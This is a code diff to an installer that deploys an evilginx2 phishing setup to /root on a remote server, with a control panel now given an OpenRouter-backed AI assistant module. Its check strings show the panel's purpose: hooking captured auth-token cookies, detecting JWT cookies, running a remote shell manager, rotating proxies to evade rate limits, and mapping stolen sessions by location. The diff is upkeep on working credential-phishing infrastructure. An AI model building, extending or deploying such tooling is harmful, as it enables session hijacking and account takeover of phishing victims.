@@ -41,7 +41,7 @@ if getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
     HERE = sys._MEIPASS
 PAYLOAD = os.path.join(HERE, "payload")
 PANEL_PORT = 8443
-PANEL_BUILD = "3.5.7"  # keep in sync with payload/app.py PANEL_VERSION
+PANEL_BUILD = "3.5.8"  # keep in sync with payload/app.py PANEL_VERSION
 GO_VER = "1.20"
 REMOTE_HOME_DEFAULT = "/root"
 REMOTE_EGX = "/root/evilginx2"
@@ -539,6 +539,7 @@ class Installer:
         self.ssh.mkdir_p(f"{REMOTE_PANEL}/templates")
         mapping = [
             (os.path.join(PAYLOAD, "app.py"), f"{REMOTE_PANEL}/app.py"),
+            (os.path.join(PAYLOAD, "ai_assistant.py"), f"{REMOTE_PANEL}/ai_assistant.py"),
             (os.path.join(PAYLOAD, "proxy_engine.py"), f"{REMOTE_PANEL}/proxy_engine.py"),
             (os.path.join(PAYLOAD, "requirements.txt"), f"{REMOTE_PANEL}/requirements.txt"),
             (os.path.join(PAYLOAD, "templates", "index.html"), f"{REMOTE_PANEL}/templates/index.html"),
@@ -556,7 +557,8 @@ class Installer:
         hook_py = os.path.join(PAYLOAD, "patches", "apply_egx_429_hook.py")
         required_marks = {
             hook_py: ["egx-429", "StatusCode == 429", "auth_tokens = pl.cookieAuthTokens"],
-            os.path.join(PAYLOAD, "app.py"): ["def api_sessions_clear", "def api_fs_list", "def api_service_create", "def favicon", "def _cookie_looks_like_jwt", "class ShellManager", "class JournalFollower", "def api_health", "def api_proxy_key", "import proxy_engine", "def api_proxy_carousel", "def _proxy_live_loop", "def _parse_exec_start", "PYTHONUNBUFFERED", "def api_dashboard_map", "_geo_lookup", "def api_proxy_custom_add"],
+            os.path.join(PAYLOAD, "app.py"): ["def api_sessions_clear", "def api_fs_list", "def api_service_create", "def favicon", "def _cookie_looks_like_jwt", "class ShellManager", "class JournalFollower", "def api_health", "def api_proxy_key", "import proxy_engine", "def api_proxy_carousel", "def _proxy_live_loop", "def _parse_exec_start", "PYTHONUNBUFFERED", "def api_dashboard_map", "_geo_lookup", "def api_proxy_custom_add", "import ai_assistant"],
+            os.path.join(PAYLOAD, "ai_assistant.py"): ["/api/ai/chat", "/api/ai/autofix", "OpenRouter", "ai_openrouter.json"],
             os.path.join(PAYLOAD, "proxy_engine.py"): [
                 "def deploy_async", "class _Sidecar", "def record_auth_429", "def repair_instance",
                 "def _install_squid", "def detach", "def drop_proxy_tunnels", "def _wait_guest_ready", "def _repair_install",
@@ -573,6 +575,7 @@ class Installer:
                 "Session Map", "dashClickPoint", "dash-z-reset",
                 "dashMapSearch", "dashMapCountry", "dashGoHit",
                 "pxCustomAdd", "Add Custom Proxies", "pxCustomType",
+                "AI-Assistant", "page-ai", "loadAi", "ai-dd-btn",
             ],
             os.path.join(PAYLOAD, "templates", "login.html"): [
                 "/static/logo.png", "favicon-32.png", "logo-mark", "ZynTarvo",
